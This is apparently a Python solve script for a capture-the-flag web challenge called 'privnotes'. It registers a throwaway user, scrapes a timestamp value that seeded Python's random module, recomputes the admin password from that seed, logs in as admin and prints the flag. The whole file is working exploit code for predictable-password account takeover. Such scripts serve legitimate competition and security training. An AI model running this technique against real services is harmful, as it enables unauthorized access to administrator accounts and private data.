import requests
import os
import re
import random
import string

regex = r'raw="[\d]*[.][\d]*"'
flag = r'flag{.*}'
url = "http://privnotes.challs.olicyber.it/"
s = requests.Session()
username = os.urandom(8).hex()
s.post(url + 'register', data={'username': username})
r = s.get(url + 'users')
raws = float(re.findall(regex, r.text)[0].replace('raw="', '').replace('"', ''))
random.seed(raws)
password = "".join(random.choices(string.ascii_letters + string.digits, k=16))
s.post(url + 'login', data={'username': 'admin', 'password': password})
r = s.get(url + 'notes')
flags = re.findall(flag, r.text)
if flags:
	print(flags[0])
else:
	print('Flag non trovata')